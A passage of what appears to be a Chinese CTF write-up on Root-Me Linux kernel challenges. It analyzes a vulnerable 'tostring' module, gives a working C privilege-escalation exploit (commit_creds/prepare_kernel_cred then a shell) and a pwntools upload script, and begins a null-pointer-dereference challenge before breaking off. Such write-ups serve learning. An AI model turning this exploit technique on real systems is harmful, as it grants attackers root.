class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>(<span class="built_in">snprintf</span>(buf,len,<span class="string">"%16llx\n"</span>,tostring.tostring_stack[--tostring.pointer]));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read_dec</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: read_dec()\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (tostring.pointer &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>(<span class="built_in">snprintf</span>(buf,len,<span class="string">"%lld\n"</span>,tostring.tostring_stack[--tostring.pointer]));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_write</span><span class="params">(struct file *f, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,<span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *bufk;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: write()\n"</span>);</span><br><span class="line">    <span class="comment">// rajout du 0 final</span></span><br><span class="line"></span><br><span class="line">    bufk = kmalloc(len + <span class="number">1</span>, GFP_DMA);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bufk)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(bufk, buf, len))</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">        bufk[len] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bufk[<span class="number">0</span>]==<span class="string">'M'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bufk[<span class="number">1</span>]==<span class="string">'H'</span>) tostring.tostring_read= tostring_read_hexa;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (bufk[<span class="number">1</span>]==<span class="string">'D'</span>) tostring.tostring_read= tostring_read_dec;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            printk(<span class="string">"tostring: insertion %d\n"</span>,*((<span class="keyword">int</span> *) bufk));</span><br><span class="line">            tostring.tostring_stack[tostring.pointer++]= *((<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *) bufk);;      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kfree(bufk);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pugs_fops</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .<span class="built_in">open</span> = tostring_open,</span><br><span class="line">    .<span class="built_in">release</span> = tostring_close,</span><br><span class="line">    .<span class="built_in">read</span> = tostring_read,</span><br><span class="line">    .<span class="built_in">write</span> = tostring_write</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">tostring_init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Constructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring registered"</span>);</span><br><span class="line">    tostring.pointer=<span class="number">0</span>;</span><br><span class="line">    tostring.tostring_read= tostring_read_hexa;</span><br><span class="line">    <span class="keyword">if</span> (alloc_chrdev_region(&amp;first, <span class="number">0</span>, <span class="number">1</span>, <span class="string">"tostring"</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((cl = class_create(THIS_MODULE, <span class="string">"chardrv"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (device_create(cl, <span class="literal">NULL</span>, first, <span class="literal">NULL</span>, <span class="string">"tostring"</span>) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">"Tostring error"</span>);</span><br><span class="line">        class_destroy(cl);</span><br><span class="line">        unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cdev_init(&amp;c_dev, &amp;pugs_fops);</span><br><span class="line">    <span class="keyword">if</span> (cdev_add(&amp;c_dev, first, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(cl, first);</span><br><span class="line">        class_destroy(cl);</span><br><span class="line">        unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"&lt;Major, Minor&gt;: &lt;%d, %d&gt;\n"</span>, MAJOR(first), MINOR(first));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">tostring_exit</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Destructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">3</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring unregistered"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(tostring_init);</span><br><span class="line">module_exit(tostring_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"F.Boisson"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"Module Tostring Integers Dec/Hex"</span>);</span><br></pre></td></tr></table></figure>

<p>重点分析read和write函数</p>
<h5 id="read"><a href="#read" class="headerlink" title="read"></a>read</h5><ul>
<li><p>打印字符串<code>Tostring: read()\n</code></p>
</li>
<li><p>调用了0x8000984，参数是输入的数据</p>
<p><img src="/2021/06/05/kernel-study/image-20210603145537156.png" alt="image-20210603145537156"></p>
<p>0x8000984在bss段上，且上面有一个0x8000784、0x8000788</p>
<p><img src="/2021/06/05/kernel-study/image-20210603145615870.png" alt="image-20210603145615870"></p>
<p><img src="/2021/06/05/kernel-study/image-20210603145652475.png" alt="image-20210603145652475"></p>
</li>
</ul>
<h5 id="write"><a href="#write" class="headerlink" title="write"></a>write</h5><ul>
<li><p>打印字符串<code>Tostring: write()\n</code></p>
</li>
<li><p>申请一块空间 =&gt; <code>bufk = kmalloc(len + 1, GFP_DMA)</code></p>
</li>
<li><p>将write函数的数据写入申请的chunk中 =&gt; <code>copy_from_user(bufk, buf, len)</code></p>
</li>
<li><p>将输入的数据拷贝到栈上 =&gt; <code>tostring.tostring_stack[tostring.pointer++]= *((long long int *) bufk);</code></p>
<ul>
<li>一次拷贝long long int，也就是八字节</li>
<li>拷贝的地址是0x8000784</li>
</ul>
<p><img src="/2021/06/05/kernel-study/image-20210603150742793.png" alt="image-20210603150742793"></p>
</li>
<li><p>释放，结束</p>
</li>
</ul>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
<li>程序write时候，将数据拷贝到栈上0x8000784</li>
<li>执行read函数，会执行栈上的地址0x8000984</li>
<li>所以，如果一直执行write函数，覆盖到0x8000984地址为shellcode，就可以get shell</li>
<li>距离是0x200，因为一次只能写八字节，需要循环写40次</li>
<li>然后将0x8000984地址覆盖成shellcode</li>
<li>调用read函数</li>
</ol>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> receive[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs;popl tf+4;"</span>    <span class="comment">//set cs</span></span><br><span class="line">        <span class="string">"pushfl;popl tf+8;"</span>       <span class="comment">//set eflags</span></span><br><span class="line">        <span class="string">"pushl %esp;popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss;popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;get_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC10711F0</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC1070E80</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">          <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Padding[<span class="number">9</span>] = <span class="string">"AAAAAAAA"</span>;			<span class="comment">//一次覆盖8字节</span></span><br><span class="line">    <span class="keyword">char</span> Eip[<span class="number">5</span>];							<span class="comment">//shellcode地址</span></span><br><span class="line">    init_tf_work();							<span class="comment">//初始化</span></span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/tostring"</span>,<span class="number">2</span>);		<span class="comment">//使用该驱动</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x40</span>; i++)			<span class="comment">//覆盖前面0x200的垃圾数据</span></span><br><span class="line">        <span class="built_in">write</span>(fd,Padding,<span class="keyword">sizeof</span>(Padding));	</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"OK!n"</span>,<span class="keyword">sizeof</span>(Eip));			<span class="comment">//友好提示</span></span><br><span class="line">    *((<span class="keyword">void</span>**)(Eip)) = &amp;payload;			<span class="comment">//将shellocde地址写入eip</span></span><br><span class="line">    <span class="built_in">write</span>(fd,Eip,<span class="keyword">sizeof</span>(Eip));				<span class="comment">//将eip写入0x80000984</span></span><br><span class="line">    <span class="built_in">read</span>(fd,receive,<span class="number">255</span>);					<span class="comment">//执行read函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="调试信息"><a href="#调试信息" class="headerlink" title="调试信息"></a>调试信息</h5><ul>
<li>ida中bss段的起始地址是0x8000780</li>
<li>程序执行的data段起始地址是0xc8824600</li>
</ul>
<p>所以，拷贝的起始地址0x8000780在调试的时候就是0xc8824604</p>
<hr>
<p>执行一次write</p>
<p><img src="/2021/06/05/kernel-study/image-20210603152453197.png" alt="image-20210603152453197"></p>
<p>执行完40次write，再执行 write(fd,Eip,sizeof(Eip));【也就是将shellcode地址写入了0xc8824804这个地址】</p>
<p><img src="/2021/06/05/kernel-study/image-20210603152841301.png" alt="image-20210603152841301"></p>
<h4 id="question"><a href="#question" class="headerlink" title="question"></a>question</h4><blockquote>
<p>远程提权失败，也不知道为什么，，，权限是变了，但是变得很奇怪。。。</p>
<p><img src="/2021/06/05/kernel-study/image-20210604143845221.png" alt="image-20210604143845221"></p>
<p>本地ok</p>
<p><img src="/2021/06/05/kernel-study/image-20210604143951129.png" alt="image-20210604143951129"></p>
<p><img src="/2021/06/05/kernel-study/image-20210604144004010.png" alt="image-20210604144004010"></p>
</blockquote>
<h5 id="上传脚本"><a href="#上传脚本" class="headerlink" title="上传脚本"></a>上传脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.update(log_level='debug')</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"challenge03.root-me.org"</span></span><br><span class="line">PORT =  <span class="number">2223</span></span><br><span class="line"></span><br><span class="line">USER = <span class="string">"app-systeme-ch1"</span></span><br><span class="line">PW = <span class="string">"app-systeme-ch1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compile</span><span class="params">()</span>:</span></span><br><span class="line">    log.info(<span class="string">"Compile"</span>)</span><br><span class="line">    <span class="comment"># os.system("musl-gcc -w -s -static -o3 oob.c -o exp")</span></span><br><span class="line">    os.system(<span class="string">"gcc -m32 -static -o exp poc.c"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    r.sendline(cmd)</span><br><span class="line">    r.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    p = log.progress(<span class="string">"Upload"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"exp"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(encoded), <span class="number">300</span>):</span><br><span class="line">        p.status(<span class="string">"%d / %d"</span> % (i, len(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">"echo \"%s\" &gt;&gt; benc"</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line"></span><br><span class="line">    exec_cmd(<span class="string">"cat benc | base64 -d &gt; bout"</span>)</span><br><span class="line">    exec_cmd(<span class="string">"chmod +x bout"</span>)</span><br><span class="line">    exec_cmd(<span class="string">"./bout"</span>)</span><br><span class="line"></span><br><span class="line">    p.success()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    compile()</span><br><span class="line">    upload()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        session = ssh(USER, HOST, PORT, PW)</span><br><span class="line">        r = session.run(<span class="string">"/bin/sh"</span>)</span><br><span class="line">        exploit(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(<span class="string">"./startvm.sh"</span>)</span><br><span class="line">        <span class="keyword">print</span> util.proc.pidof(r)</span><br><span class="line">        pause()</span><br><span class="line">        exploit(r)</span><br></pre></td></tr></table></figure>

<h5 id="musl-gcc编译32位"><a href="#musl-gcc编译32位" class="headerlink" title="musl-gcc编译32位"></a>musl-gcc编译32位</h5><ul>
<li><p>gcc编译的，没用musl-gcc</p>
</li>
<li><p>musl-gcc怎么编译32位的？没有-m32参数</p>
</li>
</ul>
<h3 id="2-Root-Me-LinKern-x86-Null-pointer-dereference"><a href="#2-Root-Me-LinKern-x86-Null-pointer-dereference" class="headerlink" title="2.[Root-Me]LinKern x86 - Null pointer dereference"></a>2.[Root-Me]LinKern x86 - Null pointer dereference</h3><h4 id="下载文件-1"><a href="#下载文件-1" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="https://www.root-me.org/en/Challenges/App-System/LinKern32-Null-pointer-dereference" target="_blank" rel="noopener">下载地址</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2223 app-systeme-ch2@challenge03.root-me.org</span><br><span class="line">密码:app-systeme-ch2</span><br></pre></td></tr></table></figure>

<p>拷贝文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2223 app-systeme-ch2@challenge03.root-me.org:/challenge/app-systeme/ch2/* .</span><br><span class="line">密码:app-systeme-ch2</span><br></pre></td></tr></table></figure>

<h4 id="分析init文件"><a href="#分析init文件" class="headerlink" title="分析init文件"></a>分析init文件</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /passwd</span><br><span class="line">mount -t ext2 -o ro /dev/sda /passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># share</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /mnt/share</span><br><span class="line">mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync</span><br><span class="line">chmod 777 /mnt/share/</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># module</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">insmod /lib/modules/*/rootme/*.ko</span><br><span class="line">chmod 666 /dev/tostring </span><br><span class="line"><span class="comment"># mmap_min_addr to 0 for the challenge to be simpler for now ;)</span></span><br><span class="line">echo 0 &gt; /proc/sys/vm/mmap_min_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">export ENV=/etc/profile</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"> </span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /dev</span><br><span class="line"> </span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>和上一题的init差不多</p>
<h4 id="分析LKMs文件-1"><a href="#分析LKMs文件-1" class="headerlink" title="分析LKMs文件"></a>分析LKMs文件</h4><p>路径由init可知：<code>/lib/modules/*/rootme/*.ko</code></p>
<p><img src="/2021/06/05/kernel-study/image-20210603220411473.png" alt="image-20210603220411473"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/nullpoint/initramfs/lib/modules/4.10.3/rootme$ file tostring.ko </span><br><span class="line">tostring.ko: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), BuildID[sha1]=d55b3e2795a90b029627ae2fcc47291702c1784b, not stripped</span><br><span class="line">winter@ubuntu:~/nullpoint/initramfs/lib/modules/4.10.3/rootme$ checksec tostring.ko </span><br><span class="line">[*] '/home/winter/nullpoint/initramfs/lib/modules/4.10.3/rootme/tostring.ko'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>同样给了源码，<code>ch2.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span 